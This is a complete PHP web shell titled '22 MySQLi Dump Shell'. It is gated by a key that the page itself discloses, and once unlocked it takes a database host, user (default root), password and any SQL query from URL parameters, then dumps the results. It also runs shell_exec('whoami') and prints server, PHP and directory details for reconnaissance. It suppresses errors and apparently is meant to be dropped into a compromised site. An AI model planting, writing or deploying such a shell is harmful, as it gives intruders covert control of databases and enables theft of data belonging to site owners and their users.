<?php
@error_reporting(0);
$T="22 MySQLi Dump Shell";
$M="M22-DBOK";
$ok=(isset($_GET['k'])&&@md5((string)$_GET['k'])==='9a6c58460ac73581a1548bf49ff90ee7');
$out="";
$h=isset($_GET['h'])?(string)$_GET['h']:'127.0.0.1';
$u=isset($_GET['u'])?(string)$_GET['u']:'root';
$pw=isset($_GET['pw'])?(string)$_GET['pw']:'';
$db=isset($_GET['db'])?(string)$_GET['db']:'mysql';
$q=isset($_GET['q'])?(string)$_GET['q']:'';
if(!$ok){$out.="[GATE: k=sqlprobe]";}
elseif($q===''){$out.="[no query]";}
else{ @mysqli_report(MYSQLI_REPORT_OFF); $m=@mysqli_connect($h,$u,$pw,$db);
 if(!$m){$out.='CONN-FAIL '.@mysqli_connect_error();}
 else{ $r=@$m->query($q); if(!$r){$out.='QUERY-FAIL '.@$m->error;}elseif(is_object($r)){$out.="rows=".$r->num_rows."\n"; while($row=$r->fetch_assoc()){$out.=implode(' | ',array_map('htmlspecialchars',$row))."\n";} }else{$out.='OK affected='.$m->affected_rows;} @$m->close(); } }

$si='';
$u=@trim((string)@shell_exec('whoami'));
$si.=($u!==''?htmlspecialchars($u):'(no shell_exec)').' | '.@phpversion().' | '.@php_sapi_name().' | '.@htmlspecialchars((string)@php_uname());
$cwd=@getcwd();
$si.=' | cwd='.($cwd!==false?htmlspecialchars($cwd):'n/a');
$S=(string)@$_GET['language'];
$faction=($S!==''?'?':'#');
$hid=($S!==''?'<input type="hidden" name="language" value="'.htmlspecialchars($S).'" /><input type="hidden" name="action" value="go" />':'');

echo '<div style="font-family:Consolas,monospace;font-size:13px;background:#101418;color:#e8e8e8;border:1px solid #3a6ea5;border-radius:6px;padding:10px;margin:8px 0;max-width:1200px;overflow:auto">'
  .'<div style="border-bottom:1px solid #3a6ea5;padding-bottom:6px"><b style="color:#7ce38b">'.$T.'</b> <span style="color:#f6c453">['.$M.']</span> '
  .($ok?'<span style="color:#7ce38b">GATE:OK</span>':'<span style="color:#ff7b72">GATE:LOCKED</span>')
  .'<div style="color:#9aa4af;font-size:12px;margin-top:4px">'.$si.'</div></div>'
  .'<form method="get" action="'.$faction.'" enctype="multipart/form-data" style="margin:8px 0">'.$hid
  .'<table><tr><td>k</td><td><input type="password" name="k" size="10"></td><td>host</td><td><input type="text" name="h" value="127.0.0.1" size="16"></td><td>user</td><td><input type="text" name="u" value="root" size="10"></td><td>pw</td><td><input type="text" name="pw" value="" size="10"></td><td>db</td><td><input type="text" name="db" value="mysql" size="12"></td></tr><tr><td>q</td><td colspan="7"><input type="text" name="q" value="select version()" size="70"></td><td><input type="submit" value="query"></td></tr></table><div style="color:#9aa4af;font-size:11px">gate k=sqlprobe; MySQLi client (no local file include)</div>'
  .'</form>'
  .'<pre style="background:#0b0e11;border:1px solid #22303f;color:#d6e2ff;padding:8px;border-radius:4px;overflow:auto;margin:0">'.htmlspecialchars($out).'</pre>'
  .'</div>';
?>
